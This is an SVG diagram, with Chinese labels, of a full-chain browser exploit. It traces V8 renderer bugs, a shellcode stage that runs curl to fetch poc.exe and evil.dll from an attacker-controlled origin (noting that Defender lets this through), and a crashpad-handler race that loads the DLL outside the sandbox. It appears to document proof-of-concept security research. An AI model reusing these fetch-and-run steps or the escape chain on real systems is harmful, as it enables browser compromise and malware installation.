<svg xmlns="http://www.w3.org/2000/svg" width="960" height="700" viewBox="0 0 960 700" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#fbfdff"/><stop offset="1" stop-color="#eef2f7"/>
    </linearGradient>
    <linearGradient id="accent" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0" stop-color="#2563eb"/><stop offset="1" stop-color="#06b6d4"/>
    </linearGradient>
    <filter id="sh" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="1.5" stdDeviation="2.5" flood-color="#0f172a" flood-opacity="0.10"/>
    </filter>
    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#64748b"/>
    </marker>
    <marker id="arb" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#2563eb"/>
    </marker>
    <marker id="arg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#059669"/>
    </marker>
  </defs>
  <rect width="960" height="700" fill="url(#bg)"/>
  <text x="480" y="36" text-anchor="middle" font-size="20" font-weight="bold" fill="#0f172a">v4 全链架构：网页 → 渲染层 ACE → curl 落地 → crashpad OS 沙箱逃逸</text>
  <rect x="380" y="46" width="200" height="3.5" rx="1.75" fill="url(#accent)"/>
  <text x="480" y="66" text-anchor="middle" font-size="12" fill="#64748b">零硬编码本地路径：origin / chrome 路径 / TEMP 全部运行期自取</text>

  <!-- origin server -->
  <g filter="url(#sh)">
    <rect x="28" y="92" width="176" height="140" rx="10" fill="#ffffff" stroke="#059669" stroke-width="1.5"/>
    <rect x="28" y="92" width="5" height="140" rx="2.5" fill="#059669"/>
  </g>
  <text x="116" y="116" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#065f46">同源 HTTP 服务器</text>
  <text x="116" y="136" text-anchor="middle" font-size="10.5" fill="#059669">runner.exe</text>
  <g font-family="Consolas,monospace" font-size="11" fill="#065f46">
    <text x="116" y="158" text-anchor="middle">run_w4.html</text>
    <text x="116" y="178" text-anchor="middle">poc.exe (52 KB)</text>
    <text x="116" y="198" text-anchor="middle">evil.dll (11 KB)</text>
  </g>
  <rect x="76" y="210" width="80" height="16" rx="8" fill="#d1fae5"/>
  <text x="116" y="222" text-anchor="middle" font-size="9.5" font-weight="bold" fill="#065f46">攻击者控制</text>

  <!-- renderer lane -->
  <rect x="224" y="92" width="500" height="292" rx="12" fill="#eff6ff" stroke="#2563eb" stroke-width="1.5" stroke-dasharray="7 4"/>
  <rect x="404" y="82" width="140" height="20" rx="10" fill="#2563eb"/>
  <text x="474" y="96" text-anchor="middle" font-size="11.5" font-weight="bold" fill="#ffffff">渲染进程（V8 沙箱内）</text>

  <g filter="url(#sh)">
    <rect x="244" y="116" width="220" height="56" rx="8" fill="#ffffff" stroke="#2563eb"/>
  </g>
  <circle cx="262" cy="134" r="9" fill="#2563eb"/><text x="262" y="138" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#fff">1</text>
  <text x="354" y="139" text-anchor="middle" font-size="12" font-weight="bold" fill="#1e40af">stage1w.js</text>
  <text x="354" y="158" text-anchor="middle" font-size="10.5" fill="#2563eb">87491 addrof + 85046 cage RW</text>

  <g filter="url(#sh)">
    <rect x="244" y="186" width="220" height="56" rx="8" fill="#ffffff" stroke="#2563eb"/>
  </g>
  <circle cx="262" cy="204" r="9" fill="#2563eb"/><text x="262" y="208" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#fff">2</text>
  <text x="354" y="209" text-anchor="middle" font-size="12" font-weight="bold" fill="#1e40af">pocwin_full_w4.js</text>
  <text x="354" y="228" text-anchor="middle" font-size="10.5" fill="#2563eb">异常符号伪造 → 跳表别名 → 部署</text>

  <g filter="url(#sh)">
    <rect x="244" y="256" width="220" height="104" rx="8" fill="#dbeafe" stroke="#1e40af" stroke-width="1.5"/>
  </g>
  <circle cx="262" cy="274" r="9" fill="#1e40af"/><text x="262" y="278" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#fff">3</text>
  <text x="358" y="279" text-anchor="middle" font-size="12" font-weight="bold" fill="#1e3a8a">payload_w4（2.6KB 机器码）</text>
  <text x="354" y="299" text-anchor="middle" font-size="10.5" fill="#1e40af">PEB→IAT→kernel32 5 导出</text>
  <text x="354" y="316" text-anchor="middle" font-size="10.5" fill="#1e40af">curl 拉双文件 → 启动竞态器</text>
  <text x="354" y="340" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#dc2626">自旋 1s → 主动崩溃 0xDEAD0021</text>

  <g filter="url(#sh)">
    <rect x="492" y="116" width="212" height="88" rx="8" fill="#ffffff" stroke="#4f46e5"/>
  </g>
  <text x="598" y="139" text-anchor="middle" font-size="12" font-weight="bold" fill="#3730a3">g_origin 洞 @0x950</text>
  <text x="598" y="158" text-anchor="middle" font-size="10.5" fill="#4f46e5">JS 部署时注入</text>
  <text x="598" y="175" text-anchor="middle" font-size="10.5" fill="#4f46e5" font-family="Consolas,monospace">location.origin</text>
  <text x="598" y="192" text-anchor="middle" font-size="10.5" fill="#4f46e5">（逐 4 字节 arwWrite）</text>

  <g filter="url(#sh)">
    <rect x="492" y="218" width="212" height="142" rx="8" fill="#ffffff" stroke="#4f46e5"/>
  </g>
  <text x="598" y="241" text-anchor="middle" font-size="12" font-weight="bold" fill="#3730a3">curl.exe（系统自带）</text>
  <g font-family="Consolas,monospace" font-size="10.5" fill="#4f46e5">
    <text x="598" y="261" text-anchor="middle">-sf -o ms64.exe</text>
    <text x="598" y="277" text-anchor="middle">  ORIGIN/poc.exe</text>
    <text x="598" y="293" text-anchor="middle">-o ev64.dll</text>
    <text x="598" y="309" text-anchor="middle">  ORIGIN/evil.dll</text>
  </g>
  <rect x="528" y="324" width="140" height="18" rx="9" fill="#d1fae5"/>
  <text x="598" y="337" text-anchor="middle" font-size="9.5" font-weight="bold" fill="#065f46">Defender 实测放行 ✓</text>

  <line x1="204" y1="140" x2="240" y2="140" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <text x="222" y="132" text-anchor="middle" font-size="9.5" fill="#64748b">HTTP</text>
  <line x1="354" y1="172" x2="354" y2="184" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <line x1="464" y1="144" x2="490" y2="150" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <line x1="464" y1="214" x2="490" y2="252" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
  <text x="477" y="236" text-anchor="middle" font-size="9.5" fill="#64748b">部署+点火</text>

  <!-- racer lane -->
  <rect x="224" y="412" width="330" height="140" rx="12" fill="#fffbeb" stroke="#d97706" stroke-width="1.5" stroke-dasharray="7 4"/>
  <rect x="304" y="402" width="170" height="20" rx="10" fill="#d97706"/>
  <text x="389" y="416" text-anchor="middle" font-size="11.5" font-weight="bold" fill="#ffffff">ms64.exe 竞态器（%TEMP%）</text>
  <g font-family="Consolas,monospace" font-size="10.5" fill="#b45309">
    <text x="389" y="441" text-anchor="middle">--handler &lt;chrome自身路径&gt;</text>
    <text x="389" y="458" text-anchor="middle">--db %TEMP%\msdb --mode race</text>
    <text x="389" y="475" text-anchor="middle">--iters 8 --pages 41 --calc --dbg</text>
  </g>
  <g font-size="10.5" fill="#92400e">
    <text x="389" y="497" text-anchor="middle">布防：41 smasher + 双洞 + 8 victim + bag</text>
    <text x="389" y="514" text-anchor="middle">patch extra_memory_ranges · 6×翻页微脉冲</text>
  </g>
  <rect x="459" y="524" width="88" height="17" rx="8.5" fill="#fef3c7"/>
  <text x="503" y="536" text-anchor="middle" font-size="9" font-weight="bold" fill="#92400e">普通进程·无沙箱</text>

  <!-- handler lane -->
  <rect x="584" y="412" width="348" height="140" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="7 4"/>
  <rect x="678" y="402" width="160" height="20" rx="10" fill="#dc2626"/>
  <text x="758" y="416" text-anchor="middle" font-size="11.5" font-weight="bold" fill="#ffffff">crashpad-handler（非沙箱）</text>
  <g font-size="10.5" fill="#991b1b">
    <text x="758" y="441" text-anchor="middle">渲染器崩溃 → 读取 extra ranges</text>
  </g>
  <g font-family="Consolas,monospace" font-size="10.5" fill="#991b1b">
    <text x="758" y="460" text-anchor="middle">ReadUpTo(0xB8) 撞 NOACCESS</text>
    <text x="758" y="477" text-anchor="middle">无钳位重试读 0x168 → 溢出 0xB0</text>
  </g>
  <text x="758" y="497" text-anchor="middle" font-size="10.5" fill="#991b1b">SMMW 模板劫持 → plant 植入 → Flush</text>
  <rect x="628" y="508" width="260" height="20" rx="10" fill="#dc2626"/>
  <text x="758" y="522" text-anchor="middle" font-size="10.5" font-weight="bold" fill="#ffffff">LoadLibraryW(ev64.dll) → calc + notepad</text>

  <!-- flows between lanes -->
  <path d="M 400 384 C 400 396, 390 400, 386 410" fill="none" stroke="#2563eb" stroke-width="2" marker-end="url(#arb)"/>
  <text x="452" y="400" text-anchor="middle" font-size="10" fill="#2563eb">①CreateProcessA ②Wait ③CreateProcessA</text>
  <line x1="554" y1="482" x2="582" y2="482" stroke="#dc2626" stroke-width="2" marker-end="url(#ar)"/>
  <text x="568" y="472" text-anchor="middle" font-size="10" fill="#dc2626">崩溃</text>
  <path d="M 492 300 C 340 296, 250 260, 208 234" fill="none" stroke="#059669" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#arg)"/>
  <text x="330" y="278" text-anchor="middle" font-size="10.5" fill="#059669" transform="rotate(-13 330 278)">curl 下载 stage-2（同源）</text>

  <!-- bottom timeline -->
  <g filter="url(#sh)">
    <rect x="28" y="578" width="904" height="102" rx="10" fill="#ffffff" stroke="#e2e8f0"/>
  </g>
  <text x="480" y="602" text-anchor="middle" font-size="13" font-weight="bold" fill="#0f172a">胜负时序 —— 「主动崩溃」的价值</text>
  <line x1="70" y1="632" x2="892" y2="632" stroke="#cbd5e1" stroke-width="2.5"/>
  <g font-size="10.5" text-anchor="middle">
    <circle cx="140" cy="632" r="7" fill="#2563eb" stroke="#fff" stroke-width="2"/>
    <text x="140" y="658" fill="#334155">竞态器启动</text>
    <circle cx="330" cy="632" r="7" fill="#2563eb" stroke="#fff" stroke-width="2"/>
    <text x="330" y="658" fill="#334155">布防完成（自旋 ~1s，V8 暂停无 GC）</text>
    <circle cx="520" cy="632" r="7" fill="#dc2626" stroke="#fff" stroke-width="2"/>
    <text x="520" y="658" fill="#dc2626">写 0xDEAD0021 → 渲染器必崩</text>
    <circle cx="700" cy="632" r="7" fill="#d97706" stroke="#fff" stroke-width="2"/>
    <text x="700" y="658" fill="#b45309">handler 收尸 → 竞态开跑</text>
    <circle cx="858" cy="632" r="7" fill="#059669" stroke="#fff" stroke-width="2"/>
    <text x="858" y="658" fill="#065f46">Flush → calc 弹出</text>
  </g>
</svg>
